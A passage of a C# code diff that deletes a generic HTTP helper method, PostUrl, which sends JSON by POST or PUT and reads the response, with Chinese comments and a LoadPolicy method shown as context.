-            bool taskResult1 = await task;  //内部自己执行了GetAwaiter() 
-        }
-
-        public static string PostUrl(string url, string postData, string method)
-        {
-            string result = "";
-
-            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
-
-            req.Method = method;   //"POST" || PUT
-
-            req.ContentType = "application/json";
-
-            byte[] data = System.Text.Encoding.UTF8.GetBytes(postData);
-
-            req.ContentLength = data.Length;
-
-            using (Stream reqStream = req.GetRequestStream())
-            {
-                reqStream.Write(data, 0, data.Length);
-
-                reqStream.Close();
-            }
-            try
-            {
-                HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
-                Stream stream = resp.GetResponseStream();
-                //获取响应内容
-                using (StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8))
-                {
-                    result = reader.ReadToEnd();
-                }
-                return result;
-            }
-            catch (WebException ex)
-            {
-                HttpWebResponse resp = (HttpWebResponse)ex.Response;
-                if (resp.StatusCode == HttpStatusCode.BadRequest)
-                {
-                    Stream stream = resp.GetResponseStream();
-                    //获取响应内容
-                    using (StreamReader reader = new StreamReader(stream, System.Text.Encoding.UTF8))
-                    {
-                        result = reader.ReadToEnd();
-                    }
-                    return result;
-                }
-                return null;
-            }
         }
 
         public static void LoadPolicy()    //载入策略
